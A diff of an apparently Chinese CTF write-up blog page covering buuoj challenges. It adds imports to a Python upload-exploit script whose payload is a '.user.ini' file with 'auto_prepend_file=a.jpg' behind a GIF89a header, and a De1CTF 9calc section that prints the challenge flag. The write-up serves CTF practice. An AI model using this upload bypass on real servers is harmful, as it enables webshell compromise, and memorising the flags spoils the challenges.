@@ -156,7 +156,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    3.3k 字
+                    3.4k 字
                   </span>
                 
 
@@ -166,7 +166,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    57
+                    59
                      分钟
                   </span>
                 
@@ -197,7 +197,11 @@
             <article class="markdown-body">
               <h1 id="buuoj刷题–随缘"><a href="#buuoj刷题–随缘" class="headerlink" title="buuoj刷题–随缘"></a>buuoj刷题–随缘</h1><a id="more"></a>
 
-<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><pre><code class="hljs undefined">def fuck1():
+<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><pre><code class="hljs undefined">import requests
+import re
+import time
+
+def fuck1():
     burp0_url = &quot;http://76665c6a-9447-4456-ae5b-8865ff5260dc.node3.buuoj.cn:80/index.php&quot;
     burp0_headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:76.0) Gecko/20100101 Firefox/76.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------1303661977120032642769160913&quot;, &quot;Origin&quot;: &quot;http://76665c6a-9447-4456-ae5b-8865ff5260dc.node3.buuoj.cn&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: &quot;http://76665c6a-9447-4456-ae5b-8865ff5260dc.node3.buuoj.cn/index.php&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;&#125;
     burp0_data = &quot;-----------------------------1303661977120032642769160913\r\nContent-Disposition: form-data; name=\&quot;fileUpload\&quot;; filename=\&quot;.user.ini\&quot;\r\nContent-Type: application/octet-stream\r\n\r\nGIF89a\nauto_prepend_file=a.jpg\n\r\n-----------------------------1303661977120032642769160913\r\nContent-Disposition: form-data; name=\&quot;upload\&quot;\r\n\r\n\xe6\x8f\x90\xe4\xba\xa4\r\n-----------------------------1303661977120032642769160913--\r\n&quot;
@@ -638,9 +642,29 @@ while True:
 <p><img src="https://s1.ax1x.com/2020/05/17/Y2qqDU.png" srcset="/img/loading.gif" alt="Y2qqDU.png"></p>
 <p>这里埋个坑</p>
 <ul>
-<li>requests获取响应时间(elapsed)与超时（timeout）</li>
-<li>二分法和盲注</li>
+<li><p>requests获取响应时间(elapsed)与超时（timeout）</p>
+</li>
+<li><p>二分法和盲注</p>
+</li>
+<li><p>calcalcal全家桶 <a href="https://github.com/zsxsoft/my-ctf-challenges/blob/master/calcalcalc-family/readme.md" target="_blank" rel="noopener">https://github.com/zsxsoft/my-ctf-challenges/blob/master/calcalcalc-family/readme.md</a></p>
+</li>
 </ul>
+<h2 id="De1CTF-2019-9calc"><a href="#De1CTF-2019-9calc" class="headerlink" title="[De1CTF 2019]9calc"></a>[De1CTF 2019]9calc</h2><p>继续calc</p>
+<p>脚本来自一叶飘零大佬:<a href="https://skysec.top/2019/08/03/2019-De1CTF-Writeup/#9calc" target="_blank" rel="noopener">https://skysec.top/2019/08/03/2019-De1CTF-Writeup/#9calc</a></p>
+<p>赛题分析：官方的看不懂，合天的借鉴一下:<a href="http://www.heetian.com/info/622" target="_blank" rel="noopener">http://www.heetian.com/info/622</a></p>
+<p>这次是三个后端都搞一遍，把飘零师傅的payload分开都打一遍即可</p>
+<p><img src="https://s1.ax1x.com/2020/05/17/YRNeBj.png" srcset="/img/loading.gif" alt="YRNeBj.png"></p>
+<pre><code class="hljs undefined">flag&#123;ed8af206-7</code></pre>
+
+<p><img src="https://s1.ax1x.com/2020/05/17/YRNZuQ.png" srcset="/img/loading.gif" alt="YRNZuQ.png"></p>
+<pre><code class="hljs undefined">c81-4981-9746-2</code></pre>
+
+<p><img src="https://s1.ax1x.com/2020/05/17/YRNEjg.png" srcset="/img/loading.gif" alt="YRNEjg.png"></p>
+<pre><code class="hljs undefined">c9c70adb07f&#125;</code></pre>
+
+<p>Flag:</p>
+<pre><code class="hljs undefined">flag&#123;ed8af206-7c81-4981-9746-2c9c70adb07f&#125;</code></pre>
+
 
             </article>
             <hr>
